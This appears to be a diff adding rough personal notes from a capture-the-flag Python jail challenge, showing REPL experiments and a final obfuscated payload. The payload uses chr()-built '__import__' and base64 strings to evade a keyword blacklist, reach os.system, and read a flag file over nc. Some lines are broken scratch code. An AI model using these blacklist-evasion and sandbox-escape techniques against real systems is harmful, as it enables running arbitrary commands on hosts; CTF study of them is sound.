@@ -1,0 +1,92 @@
+
+
+# >>> [ord(x) for x in ['_','_','i','m','p','o','r','t','_','_']
+# ...
+# ...
+# KeyboardInterrupt
+# >>> [ord(x) for x in ['_','_','i','m','p','o','r','t','_','_']]
+# [95, 95, 105, 109, 112, 111, 114, 116, 95, 95]
+# >>> a=''.join(['chr(%d)' %(x) for x in _])
+# >>> a
+# 'chr(95)chr(95)chr(105)chr(109)chr(112)chr(111)chr(114)chr(116)chr(95)chr(95)'
+# >>> b=[95, 95, 105, 109, 112, 111, 114, 116, 95, 95]
+# >>> a=''.join(['chr(%d)+' %(x) for x in b])
+# >>> a
+# 'chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+'
+# >>> [ord(x) for x in ['o','s']]
+# [111, 115]
+
+baze=
+
+imp_os=_builtins.dict_[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115))
+imp_os=_builtins.dict_[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52))
+
+#base64 decode abcd
+imp_os=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52));print('abcd'))
+print(base64.b64encode(bytes('YWJjZA=='.decode('base64'),'utf-8')))
+
+b64=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52));print(b64.b64encode(bytes('YWJjZA==','utf-8')));
+b64=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52));print(b64.b64decode(bytes('YWJjZA==','utf-8')));
+imp=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115));print(imp);
+
+
+
+> imp=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115));print(imp);b64=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52));print(b64.b64decode(bytes('YWJjZA==','utf-8')));
+<module 'os' from '/usr/lib/python3.8/os.py'>
+None
+> imp.system('ls')
+bin
+blacklist.txt
+boot
+cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
+dev
+etc
+home
+jail.py
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+None
+> cat cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
+
+imp=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115));print(imp);b64=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52));print(b64.b64decode(bytes('YWJjZA==','utf-8')));
+imp=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115));print(imp);b64=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52));print(b64.b64decode(bytes('YWJjZA==','utf-8')));imp.system('ls');
+
+blts== getattr(RMbPOQHCzt, HrjYMvtxwA(b'X19idWlsdGluc19f').decode())
+
+systm= b'c3lzdGVt'
+
+
+***PAYLOAD DE LA MUERTE***
+
+imp=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115));print(imp);b64=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52));print(b64.b64decode(bytes('YWJjZA==','utf-8')));zyz=getattr(imp,b64.b64decode(b'c3lzdGVt').decode());print(zyz);print(zyz(b64.b64decode(b'Y2F0IGNmNzcyOGJlNzk4MGZkNzcwY2UwM2Q5ZDkzN2Q2ZDQwODczMTBmMDJkYjdmY2JhNmViYmFkMzhiZDY0MWJhMTkudHh0').decode()));
+
+
+
+*********************
+
+
+user-pwn18@userpwn18:~/Escritorio/killerCTF/jailpublic/jailpublic$ nc 143.198.184.186 45457
+
+    You are in jail. Can you escape?
+
+> imp=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115));print(imp);b64=__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52));print(b64.b64decode(bytes('YWJjZA==','utf-8')));zyz=getattr(imp,b64.b64decode(b'c3lzdGVt').decode());print(zyz);print(zyz(b64.b64decode(b'Y2F0IGNmNzcyOGJlNzk4MGZkNzcwY2UwM2Q5ZDkzN2Q2ZDQwODczMTBmMDJkYjdmY2JhNmViYmFkMzhiZDY0MWJhMTkudHh0').decode()));
+kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}
+<module 'os' from '/usr/lib/python3.8/os.py'>
+
+
+
+
